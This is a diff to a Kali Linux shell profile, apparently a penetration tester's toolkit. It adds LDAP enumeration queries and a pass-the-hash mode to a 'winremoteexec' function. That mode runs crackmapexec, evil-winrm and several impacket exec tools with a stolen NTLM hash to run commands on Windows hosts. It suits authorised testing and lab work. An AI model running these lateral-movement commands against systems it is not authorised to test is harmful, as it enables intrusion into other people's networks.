@@ -23,7 +23,6 @@ alias pew="cat /home/kali/hhb/windows/1-win.txt"
 alias pee="cat /home/kali/hhb/general/1-enum.txt"
 alias sudo='sudo '
 alias comb="/home/kali/hhb/helper/combine-wordlists.py"
-alias rdp="remmina > /dev/null 2>&1 &"
 
 # Edit COmmand
 eco() {
@@ -512,7 +511,7 @@ enumsmb() {
 # BloodHound
 bh() {
 	echo "Setting neo4j credentials to: neo4j:pass"
-	sudo /usr/share/neo4j/bin/neo4j-admin set-initial-password pass >/dev/null 2>/dev/null && sudo neo4j console >/dev/null &
+	sudo /usr/share/neo4j/bin/neo4j-admin dbms set-initial-password pass >/dev/null 2>/dev/null && sudo neo4j console >/dev/null &
 	echo "Waiting 10 seconds for neo4j to start up in the background..."
 	echo "When you close bloodhound neo4j will be closed automaticly after a few seconds..."
 	sleep 10
@@ -558,14 +557,17 @@ enumerateldap() {
 	[ "$1" = "" ] && echo "Usage: enumldap <ip> [port]" && return
 	port=389
 	[ ! "$2" = "" ] && port="$2"
+	echo "Running: nmap -n -sV -v --script \"ldap* and not brute\" -p \"$port\" \"$1\""
 	nmap -n -sV -v --script "ldap* and not brute" -p "$port" "$1"
-	echo "Running ldap nmap scan in background..."
+	echo "Runnin: ldap nmap scan in background..."
 	nmap_output="$(nmap -n -sV -v --script "ldap* and not brute" -p "$port" "$1")"
 	root_tree="$(echo "$nmap_output" | grep rootDomainNamingContext | cut -d ":" -f 2 | sed 's/^ //')"
 	echo ""
-	echo "Running ldapsearch in root_tree: $root_tree"
-	echo "ldapsearch -x -H ldap://$1:$port -b \"$root_tree\" '*'"
+	echo "Extracted root_tree: $root_tree"
+	echo "Running with root_tree: ldapsearch -x -H ldap://$1:$port -b \"$root_tree\" '*'"
 	ldapsearch -x -H ldap://"$1":"$port" -b "$root_tree" '*'
+	echo "Running: ldapsearch -H ldap://\"$1\":\"$port\" -x -s base -b '' \"(objectClass=*)\" \"*\""
+	ldapsearch -H ldap://"$1":"$port" -x -s base -b '' "(objectClass=*)" "*"
 	crackmapexec ldap "$1" -u '' -p ''
 }
 
@@ -581,26 +583,79 @@ winremoteexec() {
 	user="$3"
 	pw_ha="$4"
 	domain="$5"
-	crackmapexec smb "$ip" -u "$user" -p "$pw_ha" --shares
-	echo "whoami" | evil-winrm -i "$ip" -u "$domain\\$user" -p "$pw_ha"
-	echo "whoami" | impacket-smbexec "$domain/$user:$pw_ha@$ip"
-	impacket-psexec "$domain/$user:$pw_ha@$ip" whoami
-	impacket-wmiexec "$domain/$user:$pw_ha@$ip" whoami
-	impacket-atexec "$domain/$user:$pw_ha@$ip" whoami
-	impacket-dcomexec "$domain/$user:$pw_ha@$ip" whoami
+	if [ "$1" = "pw" ]; then
+		crackmapexec smb "$ip" -u "$user" -p "$pw_ha" --shares
+		echo "whoami" | evil-winrm -i "$ip" -u "$domain\\$user" -p "$pw_ha"
+		echo "whoami" | impacket-smbexec "$domain/$user:$pw_ha@$ip"
+		impacket-psexec "$domain/$user:$pw_ha@$ip" whoami
+		impacket-wmiexec "$domain/$user:$pw_ha@$ip" whoami
+		impacket-atexec "$domain/$user:$pw_ha@$ip" whoami
+		impacket-dcomexec "$domain/$user:$pw_ha@$ip" whoami
 
-	crackmapexec smb "$ip" -u "$user" -p "$pw_ha" -x whoami
-	crackmapexec smb --exec-method smbexec "$ip" -u "$user" -p "$pw_ha" -x whoami
-	crackmapexec smb --exec-method wmiexec "$ip" -u "$user" -p "$pw_ha" -x whoami
-	crackmapexec smb --exec-method atexec "$ip" -u "$user" -p "$pw_ha" -x whoami
-	crackmapexec smb --exec-method mmcexec "$ip" -u "$user" -p "$pw_ha" -x whoami
+		crackmapexec smb "$ip" -u "$user" -p "$pw_ha" -x whoami
+		crackmapexec smb --exec-method smbexec "$ip" -u "$user" -p "$pw_ha" -x whoami
+		crackmapexec smb --exec-method wmiexec "$ip" -u "$user" -p "$pw_ha" -x whoami
+		crackmapexec smb --exec-method atexec "$ip" -u "$user" -p "$pw_ha" -x whoami
+		crackmapexec smb --exec-method mmcexec "$ip" -u "$user" -p "$pw_ha" -x whoami
 
-	crackmapexec winrm "$ip" -u "$user" -p "$pw_ha" -x whoami
+		crackmapexec winrm "$ip" -u "$user" -p "$pw_ha" -x whoami
 
-	echo "Also try the following commands if ports are open:"
-	echo ""
-	echo "crackmapexec ssh \"$ip\" -u \"$user\" -p $pw_ha -x whoami"
-	echo "crackmapexec mssql \"$ip\" -u \"$user\" -p $pw_ha -x whoami"
+		echo "Also try the following commands if ports are open:"
+		echo ""
+		echo "crackmapexec ssh \"$ip\" -u \"$user\" -p $pw_ha -x whoami"
+		echo "crackmapexec mssql \"$ip\" -u \"$user\" -p $pw_ha -x whoami"
+	fi
+	if [ "$1" = "hash" ]; then
+		echo "Running: crackmapexec smb \"$ip\" -u \"$user\" -H \"$pw_ha\" --shares"
+		crackmapexec smb "$ip" -u "$user" -H "$pw_ha" --shares
+
+		echo ""
+		echo "Running: echo \"whoami\" | evil-winrm -i \"$ip\" -u \"$domain\\$user\" -H \"$pw_ha\""
+		temp_output="$(echo "whoami" | evil-winrm -i "$ip" -u "$domain\\$user" -H "$pw_ha")"
+		echo "Result: $(echo "$temp_output" | grep -i "$user")"
+		echo ""
+
+		echo "Running: echo \"whoami\" | impacket-smbexec -hashes \"$pw_ha\":\"$pw_ha\" \"$domain/$user@$ip\""
+		echo "whoami" | impacket-smbexec -hashes "$pw_ha":"$pw_ha" "$domain/$user@$ip"
+		echo ""
+		echo "Running: impacket-psexec -hashes \"$pw_ha\":\"$pw_ha\" \"$domain/$user@$ip\" whoami"
+		impacket-psexec -hashes "$pw_ha":"$pw_ha" "$domain/$user@$ip" whoami
+		echo ""
+		echo "Running: impacket-wmiexec -hashes \"$pw_ha\":\"$pw_ha\" \"$domain/$user@$ip\" whoami"
+		impacket-wmiexec -hashes "$pw_ha":"$pw_ha" "$domain/$user@$ip" whoami
+		echo ""
+		echo "Running: impacket-atexec -hashes \"$pw_ha\":\"$pw_ha\" \"$domain/$user@$ip\" whoami"
+		impacket-atexec -hashes "$pw_ha":"$pw_ha" "$domain/$user@$ip" whoami
+		echo ""
+		echo "Running: impacket-dcomexec -hashes \"$pw_ha\":\"$pw_ha\" \"$domain/$user@$ip\" whoami"
+		impacket-dcomexec -hashes "$pw_ha":"$pw_ha" "$domain/$user@$ip" whoami
+		echo ""
+
+		echo "Running: crackmapexec smb \"$ip\" -u \"$user\" -H \"$pw_ha\" -x whoami"
+		crackmapexec smb "$ip" -u "$user" -H "$pw_ha" -x whoami
+		echo ""
+		echo "Running: crackmapexec smb --exec-method smbexec \"$ip\" -u \"$user\" -H \"$pw_ha\" -x whoami"
+		crackmapexec smb --exec-method smbexec "$ip" -u "$user" -H "$pw_ha" -x whoami
+		echo ""
+		echo "Running: crackmapexec smb --exec-method wmiexec \"$ip\" -u \"$user\" -H \"$pw_ha\" -x whoami"
+		crackmapexec smb --exec-method wmiexec "$ip" -u "$user" -H "$pw_ha" -x whoami
+		echo ""
+		echo "Running: crackmapexec smb --exec-method atexec \"$ip\" -u \"$user\" -H \"$pw_ha\" -x whoami"
+		crackmapexec smb --exec-method atexec "$ip" -u "$user" -H "$pw_ha" -x whoami
+		echo ""
+		echo "Running: crackmapexec smb --exec-method mmcexec \"$ip\" -u \"$user\" -H \"$pw_ha\" -x whoami"
+		crackmapexec smb --exec-method mmcexec "$ip" -u "$user" -H "$pw_ha" -x whoami
+		echo ""
+
+		echo "Running: crackmapexec winrm \"$ip\" -u \"$user\" -H \"$pw_ha\" -x whoami"
+		crackmapexec winrm "$ip" -u "$user" -H "$pw_ha" -x whoami
+		echo ""
+
+		echo "Also try the following commands if ports are open:"
+		echo ""
+		echo "crackmapexec ssh \"$ip\" -u \"$user\" -H $pw_ha -x whoami"
+		echo "crackmapexec mssql \"$ip\" -u \"$user\" -H $pw_ha -x whoami"
+	fi
 }
 
 # Print WordList
@@ -624,4 +679,9 @@ httpverb() {
 		echo "###############################################################"
 		curl --max-time 5 -k -s -X "$verb" "$1://$2" -D - -o /dev/null
 	done
+}
+
+rdp() {
+	#remmina $@ >/dev/null 2>/dev/null &
+	xfreerdp /sec:tls /u: /v:$@
 }
